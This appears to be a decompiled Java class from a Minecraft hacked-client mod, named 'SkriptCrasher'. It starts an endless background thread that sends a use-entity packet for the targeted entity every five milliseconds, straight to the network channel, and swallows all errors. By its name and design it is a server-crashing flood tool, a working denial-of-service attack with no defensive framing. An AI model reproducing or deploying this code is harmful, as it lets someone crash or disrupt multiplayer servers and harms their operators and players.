
class SkriptCrasher extends Thread {
   public void run() {
      try {
         while(true) {
            if (Minecraft.getMinecraft().objectMouseOver.entityHit != null) {
               Minecraft.getMinecraft().getConnection().getNetworkManager().channel.writeAndFlush(new CPacketUseEntity(Minecraft.getMinecraft().objectMouseOver.entityHit));
            }

            Thread.sleep(5L);
         }
      } catch (Throwable var2) {
      }
   }
}
